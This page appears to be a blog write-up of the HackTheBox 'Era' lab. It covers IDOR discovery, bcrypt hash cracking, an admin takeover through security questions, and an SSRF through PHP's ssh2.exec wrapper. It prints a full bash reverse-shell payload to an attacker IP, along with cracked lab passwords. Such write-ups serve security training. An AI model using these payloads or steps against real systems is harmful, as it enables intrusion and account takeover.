<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Era (Linux Hard) | SidePieceVillage</title><meta name="author" content="Jay"><meta name="copyright" content="Jay"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content=" This is a linux hard box focusing on SSRF which you can use in turn to trigger ssh2.exec. This executes on the box giving a reverse shell. On the..."><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Era (Linux Hard)",
  "url": "https://d34db33fb04h.github.io/2025/07/27/Era/",
  "image": "https://d34db33fb04h.github.io/img/era.png",
  "datePublished": "2025-07-27T18:15:01.000Z",
  "dateModified": "2025-07-28T21:02:59.072Z",
  "author": [
    {
      "@type": "Person",
      "name": "Jay",
      "url": "https://d34db33fb04h.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/j-neon-oval.png"><link rel="canonical" href="https://d34db33fb04h.github.io/2025/07/27/Era/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"No results found for: ${query}","hits_stats":"${hits} articles found"}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: true,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Era (Linux Hard)',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><script>window.paceOptions = {
  restartOnPushState: false
}

btf.addGlobalFn('pjaxSend', () => {
  Pace.restart()
}, 'pace_restart')

</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/hacking-crook.gif" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">55</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">3</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/whoami/"><i class="fa-fw fas fa-user"></i><span> whoami</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> Categories</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/htb/"><i class="fa-fw fa-solid fa-cube"></i><span> HTB</span></a></li><li><a class="site-page child" href="/categories/vl/"><i class="fa-fw fas fa-building"></i><span> Vunlab</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> Nav</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/n8.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/j-neon-oval.png" alt="Logo"><span class="site-name">SidePieceVillage</span></a><a class="nav-page-title" href="/"><span class="site-name">Era (Linux Hard)</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/whoami/"><i class="fa-fw fas fa-user"></i><span> whoami</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> Categories</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/htb/"><i class="fa-fw fa-solid fa-cube"></i><span> HTB</span></a></li><li><a class="site-page child" href="/categories/vl/"><i class="fa-fw fas fa-building"></i><span> Vunlab</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> Nav</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Era (Linux Hard)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-07-27T18:15:01.000Z" title="Created 2025-07-27 13:15:01">2025-07-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-07-28T21:02:59.072Z" title="Updated 2025-07-28 16:02:59">2025-07-28</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/htb/">htb</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p><img src="/img/era.png"></p>
<p>This is a linux hard box focusing on SSRF which you can use in turn to trigger ssh2.exec. This executes on the box giving a reverse shell. On the box we escalate to eric with previously cracked hash. Using pspy, we find a binary running via cronjob. The binary <code>objcopy</code> is used to check a file, with in turn we replace with our malicious binary that upon execution gets us a shell as root. </p>
<h2 id="Initial-Nmap"><a href="#Initial-Nmap" class="headerlink" title="Initial Nmap"></a>Initial Nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE REASON         VERSION</span><br><span class="line">21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.5</span><br><span class="line">80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to http://era.htb/</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>

<h2 id="FTP-for-smiles"><a href="#FTP-for-smiles" class="headerlink" title="FTP for smiles"></a>FTP for smiles</h2><p>Looking at FTP and trying anonymous logon get us nothing. Moving on.</p>
<h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><p>Scanning this site gives us the domain name <code>era.htb</code> we can add to our hosts file. Looking at the site nothing special.</p>
<p><img src="/img/eraweb.png"></p>
<p>We can scan for subdomains, which we get a hit on <code>file</code>.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">konoha# ffuf -u http://era.htb -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H <span class="string">&#x27;Host: FUZZ.era.htb&#x27;</span> -fl 8</span><br><span class="line">&lt;</span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\</span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/</span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\</span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/</span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\</span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v2.1.0-dev</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://era.htb</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt</span></span><br><span class="line"><span class="string"> :: Header           : Host: FUZZ.era.htb</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500</span></span><br><span class="line"><span class="string"> :: Filter           : Response lines: 8</span></span><br><span class="line"><span class="string">________________________________________________&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">file                    [Status: 200, Size: 6765, Words: 2608, Lines: 234, Duration: 42ms]</span></span><br></pre></td></tr></table></figure>

<p>After adding it to our hosts file we can visit.</p>
<p><img src="/img/eraweb1.png"></p>
<p>From the looks its a storage management page were we can upload files. If we try <em>register.php</em> we get a page we can sign up.</p>
<p><img src="/img/eraweb2.png"></p>
<p>Once done we get redirected to a login page, looking around we see a upload files tab. Lets try this.</p>
<p><img src="/img/eraweb3.png"></p>
<p>Once we upload our file we get a link returned.</p>
<p><img src="/img/eraweb4.png"></p>
<p>We should try fuzzing this as it reeks of IDOR(Insecure Direct Object Reference). We can send this to burpsuite, and try numbers from 1 to our id number (4672). We add the position, start the attack and look at our lengths. We can see off the bat, id number <em>54</em> has a different length. Looking at this reveals the site backup, which we download. </p>
<p><img src="/img/eraweb5.png"></p>
<h3 id="Source-Code-for-Downloading-Admin"><a href="#Source-Code-for-Downloading-Admin" class="headerlink" title="Source Code for Downloading - Admin"></a>Source Code for Downloading - Admin</h3><p>Looking into this zip file we see the <em>download.php</em> we just used. We can look at the source code to see how this works. Upon looking at it, we find this bit that works only for admins.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// BETA (Currently only available to the admin) - Showcase file instead of downloading it</span></span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;show&#x27;</span>] === <span class="string">&quot;true&quot;</span> &amp;&amp; <span class="variable">$_SESSION</span>[<span class="string">&#x27;erauser&#x27;</span>] === <span class="number">1</span>) &#123;</span><br><span class="line">   		<span class="variable">$format</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;format&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;format&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">   		<span class="variable">$file</span> = <span class="variable">$fetched</span>[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$format</span>, <span class="string">&#x27;://&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">       		<span class="variable">$wrapper</span> = <span class="variable">$format</span>;</span><br><span class="line">       		<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: application/octet-stream&#x27;</span>);</span><br><span class="line">   		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       		<span class="variable">$wrapper</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">       		<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html&#x27;</span>);</span><br><span class="line">   		&#125;</span><br><span class="line"></span><br><span class="line">   		<span class="keyword">try</span> &#123;</span><br><span class="line">       		<span class="variable">$file_content</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$wrapper</span> ? <span class="variable">$wrapper</span> . <span class="variable">$file</span> : <span class="variable">$file</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">		<span class="variable">$full_path</span> = <span class="variable">$wrapper</span> ? <span class="variable">$wrapper</span> . <span class="variable">$file</span> : <span class="variable">$file</span>;</span><br><span class="line">		<span class="comment">// Debug Output</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;Opening: &quot;</span> . <span class="variable">$full_path</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">       		<span class="keyword">echo</span> <span class="variable">$file_content</span>;</span><br><span class="line">   		&#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">       		<span class="keyword">echo</span> <span class="string">&quot;Error reading file: &quot;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">   		&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We also have a <em>sqlite</em> database, which we can dump.</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">konoha# sqlite3 filedb.sqlite <span class="string">&#x27;.dump&#x27;</span></span><br><span class="line">PRAGMA foreign_keys<span class="operator">=</span>OFF;</span><br><span class="line"><span class="keyword">BEGIN</span> TRANSACTION;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> files (</span><br><span class="line">		fileid <span class="type">int</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line">		filepath <span class="type">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">		fileowner <span class="type">int</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">		filedate <span class="type">timestamp</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line">		);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> files <span class="keyword">VALUES</span>(<span class="number">54</span>,<span class="string">&#x27;files/site-backup-30-08-24.zip&#x27;</span>,<span class="number">1</span>,<span class="number">1725044282</span>);</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> users (</span><br><span class="line">		user_id <span class="type">INTEGER</span> <span class="keyword">PRIMARY</span> KEY AUTOINCREMENT,</span><br><span class="line">		user_name <span class="type">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">		user_password <span class="type">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">		auto_delete_files_after <span class="type">int</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line">		, security_answer1 <span class="type">varchar</span>(<span class="number">255</span>), security_answer2 <span class="type">varchar</span>(<span class="number">255</span>), security_answer3 <span class="type">varchar</span>(<span class="number">255</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> users <span class="keyword">VALUES</span>(<span class="number">1</span>,<span class="string">&#x27;admin_ef01cab31aa&#x27;</span>,<span class="string">&#x27;$2y$10$wDbohsUaezf74d3sMNRPi.o93wDxJqphM2m0VVUp41If6WrYr.QPC&#x27;</span>,<span class="number">600</span>,<span class="string">&#x27;Maria&#x27;</span>,<span class="string">&#x27;Oliver&#x27;</span>,<span class="string">&#x27;Ottawa&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> users <span class="keyword">VALUES</span>(<span class="number">2</span>,<span class="string">&#x27;eric&#x27;</span>,<span class="string">&#x27;$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm&#x27;</span>,<span class="number">-1</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> users <span class="keyword">VALUES</span>(<span class="number">3</span>,<span class="string">&#x27;veronica&#x27;</span>,<span class="string">&#x27;$2y$10$xQmS7JL8UT4B3jAYK7jsNeZ4I.YqaFFnZNA/2GCxLveQ805kuQGOK&#x27;</span>,<span class="number">-1</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> users <span class="keyword">VALUES</span>(<span class="number">4</span>,<span class="string">&#x27;yuri&#x27;</span>,<span class="string">&#x27;$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.&#x27;</span>,<span class="number">-1</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> users <span class="keyword">VALUES</span>(<span class="number">5</span>,<span class="string">&#x27;john&#x27;</span>,<span class="string">&#x27;$2a$10$iccCEz6.5.W2p7CSBOr3ReaOqyNmINMH1LaqeQaL22a1T1V/IddE6&#x27;</span>,<span class="number">-1</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> users <span class="keyword">VALUES</span>(<span class="number">6</span>,<span class="string">&#x27;ethan&#x27;</span>,<span class="string">&#x27;$2a$10$PkV/LAd07ftxVzBHhrpgcOwD3G1omX4Dk2Y56Tv9DpuUV/dh/a1wC&#x27;</span>,<span class="number">-1</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>);</span><br><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> sqlite_sequence;</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> sqlite_sequence <span class="keyword">VALUES</span>(<span class="string">&#x27;users&#x27;</span>,<span class="number">16</span>);</span><br><span class="line"><span class="keyword">COMMIT</span>;</span><br></pre></td></tr></table></figure>

<p>Putting these into a file and attempting to crack with john the ripper.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">konoha# john --wordlist=/usr/share/seclists/Passwords/xato-net-10-million-passwords.txt hashes</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 6 password hashes with 6 different salts (bcrypt [Blowfish 32/64 X3])</span><br><span class="line">Loaded hashes with cost 1 (iteration count) varying from 1024 to 4096</span><br><span class="line">Will run 8 OpenMP threads</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">mustang          (yuri)</span><br><span class="line">america          (eric)</span><br><span class="line">2g 0:00:00:23 0.02% (ETA: 2025-07-29 00:21) 0.08340g/s 54.04p/s 246.2c/s 246.2C/s moose..blahblah</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session aborted</span><br></pre></td></tr></table></figure>

<h3 id="Security-Questions"><a href="#Security-Questions" class="headerlink" title="Security Questions"></a>Security Questions</h3><p>We saw a update security questions tab, since we have usernames lets try to reset the admin password.<br><img src="/img/eraweb6.png"></p>
<p>After doing so we get this response.<br><img src="/img/eraweb7.png"></p>
<p>Lets try to sign in as the admin now. Instead of using a password we can use the security questions we just updated.<br><a href="/img/eraweb8.png"></a></p>
<p>After filling these in, we can login. Once the verify and login button is pressed we are redirected to our file storage dashboard.<br><img src="/img/eraweb9.png"></p>
<p>Once there we see the signing and site backup zip files. We knew about the site backup. We have the source code which if we rememeber we have a little piece we can try now that we‚Äôre admin.<br><img src="/img/eraweb10.png"></p>
<h3 id="Exploiting-the-flaw-in-a-new-Era-üòÉü§£"><a href="#Exploiting-the-flaw-in-a-new-Era-üòÉü§£" class="headerlink" title="Exploiting the flaw in a new Era üòÉü§£"></a>Exploiting the flaw in a new Era üòÉü§£</h3><p>So for this we are going to use the <em>show</em> parameter and the <em>format</em> parameter we saw from the <em>download.php</em>. Looking at the code if <code>://</code> is used it will treat whatever is passed as a wrapper. We can try to get a reverse shell using the <em>ssh2 library</em>. Cool trick if I might add, first we have the password for yuri and eric we can try either, I‚Äôll use yuri. </p>
<p>First we can copy the link and then go to it in our web browser, meanwhile intercepting with burpsuite. Then send it to repeater and add this to the request.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/download.php?id=150&amp;show=true&amp;format=ssh2.exec://yuri:mustang@127.0.0.1:22/bash+-c+&#x27;bash+-i+&gt;%26+/dev/tcp/10.10.14.7/9001+0&gt;%261;&#x27;</span><br></pre></td></tr></table></figure>

<p>The URI starts with <em>ssh2.exec</em>, using the ssh library. Then we have ‚Äú<em>:&#x2F;&#x2F;yuri:<a href="mailto:&#x6d;&#117;&#x73;&#116;&#x61;&#110;&#103;&#x40;&#49;&#50;&#55;&#x2e;&#48;&#46;&#x30;&#x2e;&#x31;">&#x6d;&#117;&#x73;&#116;&#x61;&#110;&#103;&#x40;&#49;&#50;&#55;&#x2e;&#48;&#46;&#x30;&#x2e;&#x31;</a>:22</em>‚Äú this part is the connection via localhost on port 22(ssh). Then we add our command we want to run, this being the ‚Äú<em>&#x2F;bash+-c+‚Äôbash+-i+&gt;%26+&#x2F;dev&#x2F;tcp&#x2F;10.10.14.7&#x2F;9001+0&gt;%261;‚Äô</em>‚Äú. Once ran we get a hang and a call back.</p>
<p><img src="/img/eraweb11.png"></p>
<h2 id="Yuri-ka-We-did-it"><a href="#Yuri-ka-We-did-it" class="headerlink" title="Yuri-ka!!!! We did it!!!"></a>Yuri-ka!!!! We did it!!!</h2><p>We can start by looking at users on the box.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yuri@era:~$ <span class="built_in">cat</span> /etc/passwd | grep sh$</span><br><span class="line"><span class="built_in">cat</span> /etc/passwd | grep sh$</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">eric:x:1000:1000:eric:/home/eric:/bin/bash</span><br><span class="line">yuri:x:1001:1002::/home/yuri:/bin/sh</span><br></pre></td></tr></table></figure>

<p>We have eric, we can try to escalate to him with his password. </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yuri@era:~$ su eric</span><br><span class="line">su eric</span><br><span class="line">Password: america</span><br><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">eric@era:/home/yuri$</span><br></pre></td></tr></table></figure>
<p><img src="/img/robocop2016.gif"></p>
<h2 id="So-Eric-now-what"><a href="#So-Eric-now-what" class="headerlink" title="So Eric, now what??"></a>So Eric, now what??</h2><p>After switching to eric, we looked at typical empty dirs to find one not so empty. </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">eric@era:/home/yuri$ <span class="built_in">cd</span> /opt</span><br><span class="line"><span class="built_in">cd</span> /opt</span><br><span class="line">eric@era:/opt$ <span class="built_in">ls</span> -lsa</span><br><span class="line"><span class="built_in">ls</span> -lsa</span><br><span class="line">total 12</span><br><span class="line">4 drwxrwxr-x  3 root root 4096 Jul 22 08:42 .</span><br><span class="line">4 drwxr-xr-x 20 root root 4096 Jul 22 08:41 ..</span><br><span class="line">4 drwxrwxr--  3 root devs 4096 Jul 22 08:42 AV</span><br></pre></td></tr></table></figure>

<p>This seems to be a AV binary of some sort, there‚Äôs a <em>monitor</em> ELF file we don‚Äôt have access to run, yet we are in the group who can modify it. </p>
